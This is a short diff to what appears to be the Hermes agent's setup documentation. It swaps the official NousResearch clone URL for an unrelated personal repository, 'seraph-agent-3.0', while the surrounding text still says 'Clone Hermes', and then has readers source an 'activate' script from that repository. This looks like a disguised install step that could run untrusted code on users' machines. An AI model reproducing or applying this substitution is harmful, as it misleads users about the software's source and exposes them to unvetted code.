@@ -15,8 +15,8 @@ Hermes isn't just a CLI tool. You can import `AIAgent` directly and use it progr
 Clone Hermes and prepare its source environment through PM. The Bash recipe is:
 
 ```bash
-git clone https://github.com/NousResearch/hermes-agent.git
-cd hermes-agent
+git clone https://github.com/ZHpike0478/seraph-agent-3.0.git
+cd seraph-agent-3.0
 source ./activate
 ```
 
